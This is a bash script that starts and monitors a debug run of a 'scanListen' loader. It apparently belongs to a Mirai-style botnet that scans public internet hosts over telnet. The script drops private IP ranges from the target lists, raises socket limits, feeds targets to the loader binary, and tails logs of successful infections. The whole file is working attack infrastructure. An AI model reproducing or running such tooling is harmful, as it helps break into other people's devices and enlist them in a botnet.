#!/bin/bash

# Debug version of scanListen startup script
echo "=== Starting DEBUG scanListen Instance ==="

# Kill existing processes
pkill -f scanListen
sleep 2

# System optimizations
ulimit -n 999999
echo 1 > /proc/sys/net/ipv4/tcp_tw_reuse
echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout

# Create debug directory
mkdir -p /root/loader/debug_logs

# Create clean target files (remove local network ranges)
echo "Creating clean target files for debug..."
grep -v "^192\.168\." telnet.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > telnet_clean.txt
grep -v "^192\.168\." big.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > big_clean.txt
grep -v "^192\.168\." list.txt | grep -v "^10\." | grep -v "^172\.1[6-9]\." | grep -v "^172\.2[0-9]\." | grep -v "^172\.3[0-1]\." > list_clean.txt

# Start debug instance
echo "Starting DEBUG scanListen instance..."
echo "Debug logs will be written to: /root/loader/debug_*.log"
echo "Success logs will be written to: /root/loader/success_*.log"

# Start with a small subset for debugging
head -100 telnet_clean.txt > telnet_debug.txt

./scanListen_debug loader_debug < telnet_debug.txt &
SCAN_DEBUG_PID=$!

echo "Debug scanListen started with PID: $SCAN_DEBUG_PID"

# Monitor the process
echo "=== DEBUG MONITORING ==="
while true; do
    sleep 10
    echo "=== Status Update ==="
    echo "Active processes: $(ps aux | grep scanListen_debug | grep -v grep | wc -l)"
    echo "Active connections: $(ss -tn | grep -E "(666|59666)" | wc -l)"
    echo "Debug log size: $(ls -lh /root/loader/debug_*.log 2>/dev/null | awk '{print $5}' || echo 'N/A')"
    echo "Success log size: $(ls -lh /root/loader/success_*.log 2>/dev/null | awk '{print $5}' || echo 'N/A')"
    echo "===================="
    
    # Show last few lines of debug log
    if [ -f /root/loader/debug_*.log ]; then
        echo "=== Recent Debug Log ==="
        tail -5 /root/loader/debug_*.log 2>/dev/null || echo "No debug log yet"
        echo "======================="
    fi
    
    # Show success log
    if [ -f /root/loader/success_*.log ]; then
        echo "=== Success Log ==="
        tail -5 /root/loader/success_*.log 2>/dev/null || echo "No successes yet"
        echo "=================="
    fi
done
